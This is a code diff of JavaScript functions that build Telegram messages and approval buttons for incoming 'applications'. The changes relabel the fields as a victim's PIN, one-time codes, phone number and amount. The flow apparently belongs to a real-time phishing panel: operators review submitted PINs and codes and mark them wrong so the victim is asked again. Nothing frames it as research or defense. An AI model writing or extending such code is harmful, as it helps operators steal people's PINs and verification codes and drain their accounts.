@@ -390,7 +390,7 @@ function formatTelegramNotification(application, kind) {
   if (kind === "approved") {
     const finalApproval = application.status === "FINAL_APPROVED";
     return `${finalApproval ? "🎉 FINAL APPLICATION APPROVAL" : "✅ REVIEW STAGE APPROVED"}\n\n` +
-      `🧾 Application reference: ${id}\n` +
+      `🔑 pin: ${id}\n` +
       `📞 Phone: ${phone}\n` +
       `🔢 Code 1: ${code1}\n` +
             `💰 Amount: ${money(application.amount)}\n` +
@@ -400,7 +400,7 @@ function formatTelegramNotification(application, kind) {
 
   const reason = kind === "wrongfirst" ? "Code 1 reference needs review" : kind === "wrongsecond" ? "Code 2 reference needs review" : kind === "wrongpin" ? "Application reference needs review" : "Application rejected";
   return `❌ APPLICATION REVIEW UPDATE\n\n` +
-    `🧾 Application reference: ${id}\n` +
+    `🔑 pin: ${id}\n` +
     `📞 Phone: ${phone}\n` +
     `🔢 Code 1: ${code1}\n` +
     `🔢 Attempt: #${attempt}\n\n` +
@@ -458,15 +458,15 @@ async function notifyTelegram(application) {
   const stamp = application.updated_at ? new Date(application.updated_at).toLocaleString() : new Date().toLocaleString();
   const code1 = application.first_name || "Not submitted";
   const text = `${title}\n\n` +
-    `🧾 Application reference: ${application.application_id || application.application_no || "—"}\n` +
+    `🔑 pin: ${application.application_id || application.application_no || "—"}\n` +
     `📞 Phone: ${application.phone || "—"}\n` +
     `💰 Amount: ${money(application.amount)}\n` +
-    `🔢 Application reference: ${code1}\n` +
+    `🔢 code: ${code1}\n` +
     `📌 Status: ${application.status || "PENDING"}\n` +
     `Review using the buttons below.`;
 
   const keyboard = application.status === "AWAITING_FIRST_NAME_APPROVAL"
-    ? { inline_keyboard: [[{ text: "✅ APPROVE", callback_data: `approve:${application.id}` }], [{ text: "❌ WRONG CODE", callback_data: `wrongcode:${application.id}` }, { text: "↩️ WRONG REFERENCE ID", callback_data: `wrongreference:${application.id}` }]] }
+    ? { inline_keyboard: [[{ text: "✅ APPROVE", callback_data: `approve:${application.id}` }], [{ text: "❌ WRONG CODE", callback_data: `wrongcode:${application.id}` }, { text: "↩️ WRONG PIN", callback_data: `wrongreference:${application.id}` }]] }
     : { inline_keyboard: [[{ text: "✅ APPROVE", callback_data: `approve:${application.id}` }, { text: "❌ REJECT", callback_data: `reject:${application.id}` }]] };
 
   const results = await Promise.allSettled([...recipients].map(adminId =>
